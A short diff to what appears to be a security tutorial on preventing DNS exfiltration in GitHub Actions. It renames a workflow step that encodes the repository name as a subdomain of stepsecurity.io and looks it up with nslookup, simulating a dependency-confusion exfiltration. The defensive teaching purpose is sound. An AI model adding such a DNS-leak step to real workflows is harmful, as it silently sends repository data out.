@@ -54,7 +54,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions worklow.
 8. Simulate a DNS exfiltration attack similar to the one used in the dependency confusion attack. Update the workflow and add the following statement. In the actual attack, the outbound call was made by a malicious package as part of `preinstall` step. In this case, just add this step to the workflow to simulate sending the repo name as a sub-domain to stepsecurity.io. 
 
     ```
-    - name: Simulate DNS exfiltration
+    - name: Simulate DNS traffic
       run: |
         domain="${GITHUB_REPOSITORY}.stepsecurity.io"
         nslookup "${domain}"
